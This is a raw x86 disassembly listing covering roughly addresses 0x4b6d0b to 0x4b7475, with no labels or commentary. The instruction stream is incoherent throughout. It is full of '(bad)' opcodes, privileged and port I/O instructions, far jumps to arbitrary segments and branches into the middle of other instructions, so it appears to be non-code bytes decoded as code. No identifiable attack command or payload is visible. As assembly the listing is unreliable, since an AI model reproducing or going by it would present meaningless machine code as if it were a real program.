  4b6d0b:	cmp    DWORD PTR [ebp+0x5e],0x12
  4b6d0f:	sahf   
  4b6d10:	pop    edx
  4b6d11:	push   0xf7411615
  4b6d16:	fist   WORD PTR [edi+0x17]
  4b6d19:	pusha  
  4b6d1a:	ins    BYTE PTR es:[edi],dx
  4b6d1b:	and    al,0x79
  4b6d1d:	inc    ebp
  4b6d1e:	and    DWORD PTR [edx-0x4cff4fe9],edx
  4b6d24:	or     BYTE PTR [ecx],0xf
  4b6d27:	add    al,0xc
  4b6d29:	and    ebp,eax
  4b6d2b:	add    eax,0xaa850305
  4b6d30:	arpl   WORD PTR ds:0xc0d20323,sp
  4b6d36:	test   ah,bh
  4b6d38:	sub    DWORD PTR [esi+ecx*2],ecx
  4b6d3b:	add    eax,0xf218c005
  4b6d40:	mov    edx,0x20028752
  4b6d45:	xchg   esp,eax
  4b6d46:	dec    esp
  4b6d47:	push   eax
  4b6d48:	mov    cl,0x96
  4b6d4a:	xor    al,0x2a
  4b6d4c:	xor    BYTE PTR [esi-0xf59c207],cl
  4b6d52:	push   0xa
  4b6d54:	sti    
  4b6d55:	je     0x4b6da0
  4b6d57:	fidiv  WORD PTR [ebx]
  4b6d59:	jecxz  0x4b6d7c
  4b6d5b:	aaa    
  4b6d5c:	mov    edx,DWORD PTR [edi-0x7dc3fc84]
  4b6d62:	push   ebx
  4b6d63:	mov    ebx,0x1021a43c
  4b6d68:	sbb    BYTE PTR [ebx+0xf],al
  4b6d6b:	adc    al,0x16
  4b6d6d:	and    BYTE PTR [esi+0x22],0x53
  4b6d71:	sti    
  4b6d72:	hlt    
  4b6d73:	jp     0x4b6d7b
  4b6d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6d76:	cmc    
  4b6d77:	call   0x9909:0x20646098
  4b6d7e:	push   ebx
  4b6d7f:	outs   dx,BYTE PTR ds:[esi]
  4b6d80:	test   cl,dh
  4b6d82:	push   ebp
  4b6d83:	or     al,0xeb
  4b6d85:	push   edx
  4b6d86:	xor    DWORD PTR [eax-0x683d3e5d],edx
  4b6d8c:	add    BYTE PTR [ecx+esi*2],al
  4b6d8f:	sub    eax,0xbf36741d
  4b6d94:	xor    al,0x6
  4b6d96:	xchg   ebp,edx
  4b6d98:	pop    ebx
  4b6d99:	retf   0x849c
  4b6d9c:	push   es
  4b6d9d:	mov    eax,ds:0x9e145241
  4b6da2:	adc    bl,ch
  4b6da4:	and    BYTE PTR [esi-0x1856562c],dh
  4b6daa:	and    BYTE PTR [eax],cl
  4b6dac:	adc    DWORD PTR [ecx],ecx
  4b6dae:	adc    DWORD PTR [ecx],eax
  4b6db0:	jl     0x4b6d72
  4b6db2:	dec    eax
  4b6db3:	push   cs
  4b6db4:	and    BYTE PTR cs:[eax],dh
  4b6db7:	mov    edi,0x1cc0a5b4
  4b6dbc:	sahf   
  4b6dbd:	mov    BYTE PTR [ebp+0x6ada3199],bl
  4b6dc3:	and    bl,cl
  4b6dc5:	leave  
  4b6dc6:	mov    eax,ds:0xe1b6e9cb
  4b6dcb:	scas   eax,DWORD PTR es:[edi]
  4b6dcc:	xchg   DWORD PTR [edx],ebp
  4b6dce:	adc    ebp,DWORD PTR [esi+ebp*2]
  4b6dd1:	mov    ch,0x59
  4b6dd3:	(bad)  
  4b6dd4:	clc    
  4b6dd5:	ins    DWORD PTR es:[edi],dx
  4b6dd6:	int3   
  4b6dd7:	xor    BYTE PTR [eax+0x300d2458],dl
  4b6ddd:	adc    al,0x14
  4b6ddf:	sbb    BYTE PTR [edx+0x238c836e],dh
  4b6de5:	mov    dl,0x1f
  4b6de7:	sub    ah,al
  4b6de9:	mov    DWORD PTR [eax],edx
  4b6deb:	pop    es
  4b6dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6ded:	mov    eax,DWORD PTR [ebp+0x23523056]
  4b6df3:	stc    
  4b6df4:	mov    fs,WORD PTR [ecx-0x1a781add]
  4b6dfa:	mov    ecx,0x14e15d92
  4b6dff:	pop    ecx
  4b6e00:	pop    eax
  4b6e01:	repz sbb esi,esi
  4b6e04:	inc    edx
  4b6e05:	ret    0x1ac5
  4b6e08:	and    ah,ah
  4b6e0a:	adc    BYTE PTR [ebp-0x5adb5e34],ch
  4b6e10:	enter  0x7f2d,0x43
  4b6e14:	pop    ss
  4b6e15:	nop
  4b6e16:	or     BYTE PTR [ecx],al
  4b6e18:	mov    edx,0x1e43044
  4b6e1d:	arpl   WORD PTR [ebx],di
  4b6e1f:	inc    eax
  4b6e20:	loop   0x4b6e53
  4b6e22:	mov    al,0xe5
  4b6e24:	add    DWORD PTR [eax+edi*1-0x5416f9f0],edi
  4b6e2b:	push   ecx
  4b6e2c:	daa    
  4b6e2d:	xchg   ecx,eax
  4b6e2e:	daa    
  4b6e2f:	or     DWORD PTR [esi-0x32d1a2d6],edx
  4b6e35:	mov    BYTE PTR [eax],al
  4b6e37:	cmp    DWORD PTR [ebp+0x2510f62c],0x3516b258
  4b6e41:	in     eax,0x69
  4b6e43:	lea    ebx,[ebx]
  4b6e45:	(bad)  
  4b6e46:	fs retf 
  4b6e48:	ins    BYTE PTR es:[edi],dx
  4b6e49:	add    eax,0x4393d34
  4b6e4e:	add    DWORD PTR [ecx+0x2d88fc8d],ebx
  4b6e54:	sbb    al,0x0
  4b6e56:	stos   BYTE PTR es:[edi],al
  4b6e57:	push   edi
  4b6e58:	add    esi,ecx
  4b6e5a:	dec    esp
  4b6e5b:	push   0x458fd1dc
  4b6e60:	sub    eax,0x134a0a4
  4b6e65:	std    
  4b6e66:	add    BYTE PTR [edx+ebp*2-0x49],0xe5
  4b6e6b:	push   edi
  4b6e6c:	jecxz  0x4b6eb0
  4b6e6e:	sbb    eax,DWORD PTR [ecx]
  4b6e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6e71:	xor    al,0xf7
  4b6e73:	dec    ebp
  4b6e74:	jmp    0x4b6e27
  4b6e76:	xor    DWORD PTR [ecx+0x23d8e58a],esi
  4b6e7c:	shr    BYTE PTR [eax+ebp*2],1
  4b6e7f:	push   0xfffffff9
  4b6e81:	es ret 
  4b6e83:	add    eax,0x533199ac
  4b6e88:	stos   DWORD PTR es:[edi],eax
  4b6e89:	pop    esi
  4b6e8a:	jns    0x4b6e1b
  4b6e8c:	sub    esi,DWORD PTR [edx+0x34c55f70]
  4b6e92:	sbb    edi,DWORD PTR [ebp-0x56544adc]
  4b6e98:	add    al,0xd9
  4b6e9a:	xor    eax,esi
  4b6e9c:	and    eax,0xd1069401
  4b6ea1:	add    DWORD PTR [esi+0x25],eax
  4b6ea4:	bound  edx,QWORD PTR es:[ebx]
  4b6ea7:	mov    cl,0xeb
  4b6ea9:	pusha  
  4b6eaa:	and    bl,BYTE PTR [ecx+eiz*1]
  4b6ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b6eae:	mov    ebx,0xf0909f8c
  4b6eb3:	jge    0x4b6ea5
  4b6eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6eb6:	jbe    0x4b6ec7
  4b6eb8:	xlat   BYTE PTR ds:[ebx]
  4b6eb9:	and    al,0x2
  4b6ebb:	adc    DWORD PTR [ebp+0x28],edx
  4b6ebe:	in     al,dx
  4b6ebf:	push   es
  4b6ec0:	pop    ebx
  4b6ec1:	sbb    ebx,DWORD PTR [ecx-0x1]
  4b6ec4:	push   0x385c9940
  4b6ec9:	daa    
  4b6eca:	jne    0x4b6ef0
  4b6ecc:	sbb    ebx,DWORD PTR [esi-0x6ef9d7dc]
  4b6ed2:	or     eax,DWORD PTR [esi]
  4b6ed4:	fild   WORD PTR [edx]
  4b6ed6:	into   
  4b6ed7:	and    ah,al
  4b6ed9:	mov    dl,BYTE PTR [eax-0x243fa69e]
  4b6edf:	retf   0xedd9
  4b6ee2:	inc    ebx
  4b6ee3:	or     eax,0x40dcee56
  4b6ee8:	add    esp,DWORD PTR [esp+ebx*8]
  4b6eeb:	xchg   DWORD PTR [ecx],eax
  4b6eed:	fstp   QWORD PTR [ebx-0x6f]
  4b6ef0:	push   es
  4b6ef1:	or     edi,0x82e0039
  4b6ef7:	call   0xd564bbec
  4b6efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b6efd:	mov    cl,0x13
  4b6eff:	das    
  4b6f00:	mov    ds:0xe12c8d48,eax
  4b6f05:	push   edx
  4b6f06:	push   edx
  4b6f07:	outs   dx,DWORD PTR ds:[esi]
  4b6f08:	jmp    0x4b6e8e
  4b6f0a:	mov    cl,0x7b
  4b6f0c:	ins    BYTE PTR es:[edi],dx
  4b6f0d:	inc    ecx
  4b6f0e:	lea    ebp,[ecx]
  4b6f10:	jne    0x4b6f29
  4b6f12:	push   ss
  4b6f13:	or     dh,BYTE PTR [edx-0x5ea8dc08]
  4b6f19:	push   ecx
  4b6f1a:	jo     0x4b6f87
  4b6f1c:	daa    
  4b6f1d:	shr    bl,1
  4b6f1f:	sbb    eax,0xc18989f4
  4b6f24:	jle    0x4b6eb0
  4b6f26:	jbe    0x4b6f38
  4b6f28:	xor    edx,DWORD PTR [ebp+0x43238a95]
  4b6f2e:	out    0x9a,eax
  4b6f30:	in     al,0x75
  4b6f32:	ret    
  4b6f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b6f34:	sub    al,0x2d
  4b6f36:	in     eax,0xbb
  4b6f38:	or     ah,dl
  4b6f3a:	adc    BYTE PTR [edx+0x32],dl
  4b6f3d:	sub    al,0x2
  4b6f3f:	jle    0x4b6f2c
  4b6f41:	or     eax,0x55145a73
  4b6f46:	je     0x4b6f99
  4b6f48:	cmp    edi,0x669f41b2
  4b6f4e:	xchg   DWORD PTR [esi-0x4feddbb7],edx
  4b6f54:	jne    0x4b6f5f
  4b6f56:	sar    DWORD PTR [eax+0x48967f6],1
  4b6f5c:	jmp    0x4b6f9d
  4b6f5e:	ds inc ebx
  4b6f60:	sbb    dl,BYTE PTR [ecx-0x76844923]
  4b6f66:	add    eax,0x561a31eb
  4b6f6b:	jne    0x4b6f7d
  4b6f6d:	push   es
  4b6f6e:	jmp    0x4b6f93
  4b6f70:	aas    
  4b6f71:	repnz xchg ecx,eax
  4b6f73:	in     eax,dx
  4b6f74:	mov    ds:0xc3323fa9,al
  4b6f79:	push   ss
  4b6f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6f7b:	daa    
  4b6f7c:	jmp    0x61c3:0xf0031aeb
  4b6f83:	xor    eax,DWORD PTR [ebx+0x41]
  4b6f86:	popw   ss
  4b6f88:	sbb    esi,edi
  4b6f8a:	cmp    cl,BYTE PTR [esi-0x10]
  4b6f8d:	inc    edx
  4b6f8e:	cli    
  4b6f8f:	cmp    eax,0x575fdde
  4b6f94:	frstor [eax+0x18c034c8]
  4b6f9a:	xchg   ebx,eax
  4b6f9b:	adc    al,0x4a
  4b6f9d:	and    ah,dl
  4b6f9f:	mov    al,ds:0x854ba7
  4b6fa4:	rol    BYTE PTR [edi+0x302b4b8],cl
  4b6faa:	dec    ecx
  4b6fab:	and    al,al
  4b6fad:	leave  
  4b6fae:	xor    BYTE PTR [esi],0xd7
  4b6fb1:	xchg   edi,eax
  4b6fb2:	inc    esp
  4b6fb3:	xor    esi,DWORD PTR [edx+ebp*8-0x36]
  4b6fb7:	push   ds
  4b6fb8:	push   ecx
  4b6fb9:	cmp    al,0xcc
  4b6fbb:	outs   dx,BYTE PTR ds:[esi]
  4b6fbc:	or     DWORD PTR [ebx+0x4c751071],edi
  4b6fc2:	add    eax,0xc9384b7
  4b6fc7:	dec    eax
  4b6fc8:	jno    0x4b6f7b
  4b6fca:	add    eax,0x105de0e0
  4b6fcf:	pop    es
  4b6fd0:	loope  0x4b6fad
  4b6fd2:	ret    0x60e1
  4b6fd5:	pop    ss
  4b6fd6:	jle    0x4b7049
  4b6fd8:	inc    ecx
  4b6fd9:	cs stc 
  4b6fdb:	(bad)  
  4b6fdd:	jg     0x4b6fa7
  4b6fdf:	cmp    ah,al
  4b6fe1:	mov    ah,0x84
  4b6fe3:	mov    al,0x97
  4b6fe5:	hlt    
  4b6fe6:	mov    esi,0xc40089da
  4b6feb:	(bad)  
  4b6fec:	aaa    
  4b6fed:	mov    eax,0x1e485700
  4b6ff2:	out    0xd9,eax
  4b6ff4:	push   ecx
  4b6ff5:	les    eax,FWORD PTR [edx]
  4b6ff7:	add    BYTE PTR [ebx+0x40],bh
  4b6ffa:	and    ah,BYTE PTR [esi+ebp*1]
  4b6ffd:	imul   eax,ebx,0xc3c27340
  4b7003:	sub    al,0xad
  4b7005:	pop    esp
  4b7006:	push   0x1eb6b4a
  4b700b:	adc    al,0x53
  4b700d:	nop
  4b700e:	xchg   ecx,eax
  4b700f:	int3   
  4b7010:	enter  0xda06,0x2e
  4b7014:	mov    ah,0xb7
  4b7016:	stos   DWORD PTR es:[edi],eax
  4b7017:	addr16 call 0x8ab77b4a
  4b701d:	sbb    DWORD PTR [eax],ebp
  4b701f:	mov    bh,0x80
  4b7021:	sar    DWORD PTR [eax],1
  4b7023:	inc    eax
  4b7024:	mov    ecx,0x67ee9841
  4b7029:	sbb    bh,al
  4b702b:	push   0x8144213c
  4b7030:	push   0x2c308ec8
  4b7035:	sub    DWORD PTR [edi+edi*8+0x2693986c],ebx
  4b703c:	(bad)  
  4b703e:	lock mov cl,0x81
  4b7041:	rcl    BYTE PTR [ecx],0x16
  4b7044:	call   0xa9c4c24a
  4b7049:	add    al,0xac
  4b704b:	adc    BYTE PTR [edi+ecx*2-0x3de1b5f4],al
  4b7052:	jg     0x4b7078
  4b7054:	sub    ebx,eax
  4b7056:	dec    ebx
  4b7057:	push   ebx
  4b7058:	inc    eax
  4b7059:	push   eax
  4b705a:	sbb    esp,DWORD PTR [ebx+0x69]
  4b705d:	xor    DWORD PTR [esi+ebp*2+0x54],0x48
  4b7062:	imul   ebx,DWORD PTR [edi+0x68],0xb609815d
  4b7069:	test   DWORD PTR gs:[esi+eiz*4],esp
  4b706d:	xchg   edx,eax
  4b706e:	and    eax,0xd5a92af5
  4b7073:	les    edx,FWORD PTR [edi]
  4b7075:	sub    eax,0x5776d2fb
  4b707a:	(bad)  
  4b707b:	and    ecx,DWORD PTR [edi+eiz*1+0x63259b55]
  4b7082:	sbb    ebp,edi
  4b7084:	jl     0x4b70fb
  4b7086:	or     dl,BYTE PTR ds:0x8b3a9a7b
  4b708c:	lahf   
  4b708d:	repnz adc BYTE PTR [edx-0x20],dh
  4b7091:	adc    eax,0x2434b27e
  4b7096:	ss iret 
  4b7098:	loop   0x4b709a
  4b709a:	cli    
  4b709b:	mov    ah,0xb0
  4b709d:	out    0xb7,al
  4b709f:	and    ecx,DWORD PTR [eax-0x1b5cad6b]
  4b70a5:	call   0x7528:0xc4cd63d2
  4b70ac:	sub    eax,esp
  4b70ae:	sbb    DWORD PTR [ebp-0x14d27bff],edi
  4b70b4:	adc    esp,ebp
  4b70b6:	fistp  DWORD PTR [ebx]
  4b70b8:	(bad)  
  4b70b9:	dec    edx
  4b70ba:	bound  ebp,QWORD PTR [eax+0x1f]
  4b70bd:	pop    ebx
  4b70be:	and    al,0xc0
  4b70c0:	cmp    ah,BYTE PTR [esi+esi*2+0x586ae0e8]
  4b70c7:	sub    BYTE PTR [ebp+ebx*8+0xf],bl
  4b70cb:	inc    ecx
  4b70cc:	rcl    ah,0x5d
  4b70cf:	sbb    BYTE PTR ds:0x347ae021,dh
  4b70d5:	push   cs
  4b70d6:	jo     0x4b705f
  4b70d8:	test   BYTE PTR [esi-0x20],cl
  4b70db:	add    eax,0x5dfaef03
  4b70e0:	sub    al,0x81
  4b70e2:	xchg   ecx,eax
  4b70e3:	jle    0x4b7141
  4b70e5:	scas   al,BYTE PTR es:[edi]
  4b70e6:	call   FWORD PTR [eax+ebx*2+0x58]
  4b70ea:	adc    al,0x37
  4b70ec:	jno    0x4b70f4
  4b70ee:	mov    ?,WORD PTR [ebx-0xf2c95f4]
  4b70f4:	loope  0x4b70b3
  4b70f6:	jo     0x4b716c
  4b70f8:	mov    dl,0x84
  4b70fa:	retf   
  4b70fb:	add    al,0xba
  4b70fd:	cdq    
  4b70fe:	adc    DWORD PTR [esi-0x66],0x26d03a5
  4b7105:	popa   
  4b7106:	cmp    al,BYTE PTR ds:0xc0e99585
  4b710c:	js     0x4b7133
  4b710e:	jne    0x4b7186
  4b7110:	pop    ds
  4b7111:	adc    al,BYTE PTR [eax+ecx*2+0x21ccde44]
  4b7118:	lods   al,BYTE PTR ds:[esi]
  4b7119:	pop    ebp
  4b711a:	rep stos DWORD PTR es:[edi],eax
  4b711c:	adc    BYTE PTR [esi],al
  4b711e:	sbb    dh,BYTE PTR [edi-0x35]
  4b7121:	pop    ebx
  4b7122:	mov    ebx,0xcfe733
  4b7127:	and    BYTE PTR [ecx+0x28],bh
  4b712a:	add    al,0x66
  4b712c:	retf   
  4b712d:	in     al,dx
  4b712e:	popf   
  4b712f:	add    al,BYTE PTR [ebp+0x7d7a0229]
  4b7135:	xor    DWORD PTR [ecx],esp
  4b7137:	pop    esp
  4b7138:	push   cs
  4b7139:	add    DWORD PTR [eax],edx
  4b713b:	fnsave [edi+0x24]
  4b713e:	je     0x4b70d0
  4b7140:	nop
  4b7141:	xchg   edx,eax
  4b7142:	adc    DWORD PTR [esi-0x154724fa],edx
  4b7148:	sbb    BYTE PTR ds:0xe710c2e9,al
  4b714f:	fld    QWORD PTR [ecx-0x7b4ee78f]
  4b7155:	popf   
  4b7156:	fcmovnb st,st(0)
  4b7158:	pop    DWORD PTR [edx]
  4b715a:	push   ds
  4b715b:	jb     0x4b70f6
  4b715d:	cmp    dh,BYTE PTR [edi+ebx*1+0x28]
  4b7161:	cmp    BYTE PTR [edx+0x17],bl
  4b7164:	sub    bh,BYTE PTR [eax-0x43]
  4b7167:	mov    eax,0x793847db
  4b716c:	push   esp
  4b716d:	je     0x4b7187
  4b716f:	jo     0x4b7173
  4b7171:	mov    DWORD PTR [esi],ecx
  4b7173:	fidiv  WORD PTR [ecx]
  4b7175:	rcl    ebx,1
  4b7177:	or     eax,0xc74b9b38
  4b717c:	outs   dx,BYTE PTR ds:[esi]
  4b717d:	cmp    BYTE PTR fs:[ebx+0x19547c38],ch
  4b7184:	dec    esp
  4b7185:	pop    eax
  4b7186:	mov    ebp,0x716f7487
  4b718b:	jne    0x4b7155
  4b718d:	xchg   edx,eax
  4b718e:	cmp    BYTE PTR [eax],dh
  4b7190:	hlt    
  4b7191:	dec    ecx
  4b7192:	pop    esp
  4b7193:	mov    ch,al
  4b7195:	dec    eax
  4b7196:	pop    eax
  4b7197:	mov    cl,0x8b
  4b7199:	lods   al,BYTE PTR ds:[esi]
  4b719a:	add    dl,BYTE PTR [esi+0x394c20bc]
  4b71a0:	dec    ebx
  4b71a1:	dec    eax
  4b71a2:	adc    eax,0x425713c4
  4b71a7:	cli    
  4b71a8:	dec    edx
  4b71a9:	xor    DWORD PTR [edi+0x5b01b423],ebx
  4b71af:	jo     0x4b722e
  4b71b1:	xchg   esp,eax
  4b71b2:	xchg   edx,eax
  4b71b3:	not    BYTE PTR [edx+0x649aebf8]
  4b71b9:	add    al,0x34
  4b71bb:	or     BYTE PTR [esi],bh
  4b71bd:	add    eax,0xb101e4ac
  4b71c2:	and    BYTE PTR [esp+ebx*8],ch
  4b71c5:	mov    dh,0xf
  4b71c7:	mov    al,ds:0xb858d63c
  4b71cc:	rcr    DWORD PTR [eax],0x68
  4b71cf:	jb     0x4b71e0
  4b71d1:	adc    ebx,DWORD PTR [edx+ebp*1+0x60]
  4b71d5:	and    eax,0x6fe1c621
  4b71da:	adc    ecx,DWORD PTR [edx]
  4b71dc:	mov    bh,ch
  4b71de:	test   al,0x3
  4b71e0:	or     BYTE PTR [ebx-0x5a635abc],dh
  4b71e6:	dec    edi
  4b71e7:	adc    eax,DWORD PTR [edx]
  4b71e9:	ret    0xb058
  4b71ec:	adc    dh,BYTE PTR [ecx]
  4b71ee:	jae    0x4b7217
  4b71f0:	int    0xd1
  4b71f2:	push   0x301828c1
  4b71f7:	pop    es
  4b71f8:	in     al,0xcf
  4b71fa:	and    DWORD PTR [esp+edx*2],ebx
  4b71fd:	and    al,0x18
  4b71ff:	push   edx
  4b7200:	inc    esp
  4b7201:	and    al,0x3a
  4b7203:	in     al,0x57
  4b7205:	enter  0x5018,0xff
  4b7209:	(bad)  
  4b720a:	(bad)  
  4b720b:	call   FWORD PTR [eax]
  4b720d:	inc    ebp
  4b720e:	lods   eax,DWORD PTR ds:[esi]
  4b720f:	sub    edx,DWORD PTR [eax-0x797cd861]
  4b7215:	cmp    al,BYTE PTR [ecx-0x67e6f75e]
  4b721b:	inc    eax
  4b721c:	test   BYTE PTR [ebx],bl
  4b721e:	or     DWORD PTR ds:0x1034fd66,0xf10cebe0
  4b7228:	test   DWORD PTR [edx+eax*4+0x451a8bee],eax
  4b722f:	cmp    DWORD PTR [eax+0x1],0x8984731b
  4b7236:	dec    ebx
  4b7237:	and    eax,0x3eec8112
  4b723c:	push   0x29
  4b723e:	add    dh,BYTE PTR [ecx]
  4b7240:	mov    eax,0x82c4a379
  4b7245:	add    DWORD PTR ds:0x19573d4b,0xffffff92
  4b724c:	mov    ds:0x47ff91c3,eax
  4b7251:	ror    BYTE PTR [eax+ecx*2],cl
  4b7254:	in     eax,0xf8
  4b7256:	clc    
  4b7257:	adc    BYTE PTR [eax],dl
  4b7259:	repz or al,0xc8
  4b725c:	adc    eax,0x9400baba
  4b7261:	push   cs
  4b7262:	xchg   DWORD PTR ds:0xc17ab621,esi
  4b7268:	les    eax,FWORD PTR [esp+ebx*1+0x1c3b35b6]
  4b726f:	je     0x4b721b
  4b7271:	xor    eax,0x8d0f3302
  4b7276:	mov    cl,0x69
  4b7278:	jmp    0xfcf9:0x2d44878b
  4b727f:	(bad)  
  4b7280:	or     al,0x63
  4b7282:	inc    esp
  4b7283:	setae  BYTE PTR [edi+0x13]
  4b7287:	jmp    0x587f:0xf98f1269
  4b728e:	sbb    BYTE PTR [edx],cl
  4b7290:	sub    eax,0x7c343137
  4b7295:	and    DWORD PTR [eax],ebx
  4b7297:	push   ss
  4b7298:	add    ebx,edx
  4b729a:	jae    0x4b72a8
  4b729c:	inc    esp
  4b729d:	ds out 0x78,al
  4b72a0:	cmp    bl,bl
  4b72a2:	xor    BYTE PTR [ebp+0x4c],dh
  4b72a5:	lock sbb edi,DWORD PTR [eax+0x74]
  4b72a9:	push   cs
  4b72aa:	push   ecx
  4b72ab:	mov    ebx,0x66584b89
  4b72b0:	jle    0x4b72b6
  4b72b2:	rcpps  xmm2,xmm2
  4b72b5:	mov    edx,0x57ffd1d8
  4b72ba:	xor    DWORD PTR [eax+0x16],edx
  4b72bd:	push   ecx
  4b72be:	outs   dx,DWORD PTR ds:[esi]
  4b72bf:	loop   0x4b7310
  4b72c1:	add    eax,DWORD PTR [ebp-0x3e508de3]
  4b72c7:	inc    esi
  4b72c8:	mov    al,0xc6
  4b72ca:	jae    0x4b730a
  4b72cc:	sbb    DWORD PTR [esi-0x7f],ebx
  4b72cf:	mov    edx,0xca267ccc
  4b72d4:	gs es push esi
  4b72d7:	inc    eax
  4b72d8:	cmp    BYTE PTR [ebx],cl
  4b72da:	cmc    
  4b72db:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b72dd:	push   ds
  4b72de:	fsub   QWORD PTR [ecx]
  4b72e0:	jmp    0x3108c367
  4b72e5:	add    DWORD PTR [ebx],edx
  4b72e7:	gs dec edi
  4b72e9:	in     al,dx
  4b72ea:	push   es
  4b72eb:	lods   al,BYTE PTR ds:[esi]
  4b72ec:	test   DWORD PTR [ebx],esp
  4b72ee:	mov    ebp,0xd40ab5e4
  4b72f3:	add    BYTE PTR ds:0x864e13e8,cl
  4b72f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b72fa:	xchg   edi,eax
  4b72fb:	pop    ecx
  4b72fc:	mov    DWORD PTR [ecx+0x22e1f482],ecx
  4b7302:	mov    eax,ds:0x2110852b
  4b7307:	imul   edi,DWORD PTR ds:0x3889d9dc,0x8acafe56
  4b7311:	inc    edx
  4b7312:	pop    ebx
  4b7313:	mov    cl,0x1e
  4b7315:	scas   al,BYTE PTR es:[edi]
  4b7316:	pop    ebp
  4b7317:	or     BYTE PTR [ebx],0xa3
  4b731a:	xchg   esp,eax
  4b731b:	sbb    al,al
  4b731d:	aad    0x5
  4b731f:	dec    esi
  4b7320:	dec    ebx
  4b7321:	cmp    bl,BYTE PTR [eax-0x17]
  4b7324:	jge    0x4b7370
  4b7326:	add    DWORD PTR [edi+0x3dda8eb],0x1f60021d
  4b7330:	or     edx,ecx
  4b7332:	pushf  
  4b7333:	mov    dl,BYTE PTR [esi]
  4b7335:	sbb    eax,edx
  4b7337:	push   eax
  4b7338:	cmp    esp,DWORD PTR [ecx]
  4b733a:	push   ss
  4b733b:	nop
  4b733c:	lahf   
  4b733d:	push   0xf9fa124a
  4b7342:	jmp    0x4b72c5
  4b7344:	jno    0x4b7379
  4b7346:	jp     0x4b73b5
  4b7348:	adc    al,0x6
  4b734a:	cmp    cl,ch
  4b734c:	aam    0xc6
  4b734e:	xor    al,0x80
  4b7350:	mov    esp,0x86cb6b86
  4b7355:	jnp    0x4b72eb
  4b7357:	loopne 0x4b735f
  4b7359:	repnz out dx,eax
  4b735b:	dec    esi
  4b735c:	mov    bl,0xf9
  4b735e:	in     eax,dx
  4b735f:	jp     0x4b7377
  4b7361:	jl     0x4b7380
  4b7363:	pinsrw mm1,WORD PTR cs:[eax+0x75],0x9e
  4b7369:	dec    BYTE PTR [edx]
  4b736b:	mov    edi,0x6c1e3405
  4b7370:	loope  0x4b7328
  4b7372:	cmp    al,0x53
  4b7374:	lods   eax,DWORD PTR ds:[esi]
  4b7375:	in     al,0x8d
  4b7377:	shr    ebx,cl
  4b7379:	xor    BYTE PTR [eax],cl
  4b737b:	pushf  
  4b737c:	ss lock imul edi,esi,0x44291b01
  4b7384:	add    BYTE PTR [esi+0x3019dd46],al
  4b738a:	popf   
  4b738b:	lods   eax,DWORD PTR ds:[esi]
  4b738c:	test   al,0xaf
  4b738e:	inc    eax
  4b738f:	fiadd  DWORD PTR [edx]
  4b7391:	and    bl,BYTE PTR [edx]
  4b7393:	xchg   ebp,eax
  4b7394:	cmp    BYTE PTR [edx],al
  4b7396:	or     al,0x49
  4b7398:	dec    esi
  4b7399:	xchg   DWORD PTR [esi-0x1206327a],eax
  4b739f:	xchg   DWORD PTR ds:0xdb16cce9,eax
  4b73a5:	movsx  esi,BYTE PTR [esi]
  4b73a8:	cmp    ebx,DWORD PTR [ebx+0x58]
  4b73ab:	sbb    al,0x89
  4b73ad:	nop
  4b73ae:	mov    esi,0x8839b60e
  4b73b3:	sbb    bl,BYTE PTR [esi-0x3e]
  4b73b6:	out    dx,eax
  4b73b7:	adc    edi,DWORD PTR [esi+0x25]
  4b73ba:	lea    ebx,[edi+0x10]
  4b73bd:	mov    edx,0x4db529d
  4b73c2:	lahf   
  4b73c3:	push   ss
  4b73c4:	add    al,0x1b
  4b73c6:	add    DWORD PTR [edx],0x7c
  4b73c9:	sbb    al,0x2
  4b73cb:	inc    esp
  4b73cc:	inc    ecx
  4b73cd:	rcr    cl,1
  4b73cf:	fild   WORD PTR [ecx-0x1983b646]
  4b73d5:	push   0xffffff89
  4b73d7:	fsubr  DWORD PTR [ebp*2-0xd57feeb]
  4b73de:	pop    ecx
  4b73df:	jbe    0x4b7430
  4b73e1:	hlt    
  4b73e2:	xchg   esi,eax
  4b73e3:	fs (bad) 
  4b73e5:	sbb    al,0x25
  4b73e7:	(bad)  
  4b73e8:	xor    al,0x91
  4b73ea:	add    al,0x21
  4b73ec:	mov    fs,WORD PTR gs:0xeb91235c
  4b73f3:	rcl    DWORD PTR [edx+ebx*8+0x4210120],0x1d
  4b73fb:	pop    ebp
  4b73fc:	dec    ebx
  4b73fd:	and    edx,DWORD PTR [esi]
  4b73ff:	sbb    BYTE PTR [ebp+0x5634c9c6],dl
  4b7405:	cmp    DWORD PTR [edx],0x9271c486
  4b740b:	stc    
  4b740c:	lds    esi,FWORD PTR [esi-0x4f7528f2]
  4b7412:	sbb    esi,DWORD PTR [ecx+0xc019212]
  4b7418:	xchg   esp,eax
  4b7419:	push   ss
  4b741a:	rcl    DWORD PTR [esi],1
  4b741c:	push   es
  4b741d:	mov    esi,0x1efb6a1
  4b7422:	or     eax,0xa480320c
  4b7427:	dec    ebp
  4b7428:	dec    ecx
  4b7429:	sub    edi,DWORD PTR [esi-0x6d]
  4b742c:	fdiv   DWORD PTR [ecx+0x64]
  4b742f:	adc    bh,BYTE PTR [eax+0x4ed85b08]
  4b7435:	data16 mov BYTE PTR [ebx+0x303c0e3a],0xd4
  4b743d:	dec    esi
  4b743e:	push   ss
  4b743f:	fiadd  WORD PTR [esi]
  4b7441:	cwde   
  4b7442:	(bad)  
  4b7443:	js     0x4b7404
  4b7445:	pusha  
  4b7446:	add    BYTE PTR [esi],dl
  4b7448:	lods   al,BYTE PTR ds:[esi]
  4b7449:	jmp    0xe5419c60
  4b744e:	ficom  DWORD PTR [edx+0x7e4cf1d8]
  4b7454:	push   esp
  4b7455:	jecxz  0x4b749b
  4b7457:	mov    eax,ds:0x8b1602f9
  4b745c:	or     bh,BYTE PTR [ecx+0xd0aefd0]
  4b7462:	inc    edx
  4b7463:	dec    esi
  4b7464:	push   es
  4b7465:	mov    edx,0xd855ed09
  4b746a:	or     BYTE PTR [eax-0x18],dl
  4b746d:	shl    DWORD PTR [edx],cl
  4b746f:	or     BYTE PTR [eax+0x5b4a423e],ch
  4b7475:	jo     0x4b745a
